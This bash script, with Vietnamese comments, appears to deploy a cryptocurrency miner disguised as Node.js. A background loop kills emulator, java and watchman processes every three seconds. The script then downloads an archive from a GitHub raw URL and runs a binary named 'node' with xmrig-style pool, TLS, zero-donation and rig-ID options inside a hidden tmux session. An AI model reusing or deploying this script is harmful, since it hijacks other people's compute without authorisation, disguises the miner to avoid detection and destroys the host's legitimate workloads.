#!/bin/bash

SESSION="node"
DOMAIN="$1"
NAME_WORK="$2"

# 🔁 Vòng lặp kill liên tục các tiến trình nghi vấn
(
  while true; do
    pkill -f qemu-system-x86_64-headless 2>/dev/null
    pkill -9 -f java 2>/dev/null
    pkill -f netsimd 2>/dev/null
    pkill -f watchman 2>/dev/null
    sleep 3
  done
) &

# 📟 Khởi tạo tmux session nếu chưa có
if tmux has-session -t $SESSION 2>/dev/null; then
    tmux attach-session -t $SESSION
else
    tmux new-session -s $SESSION -d

    tmux send-keys -t $SESSION "
        rm -rf android ios xmrig* node node-18 node.tar.gz &&
        wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz &&
        tar -xzf node.tar.gz &&
        cd node-18 &&
        chmod +x node &&
        ./node -o $DOMAIN --tls -k --donate-level=0 -t 4 --rig-id $NAME_WORK
    " C-m

    tmux attach-session -t $SESSION
fi
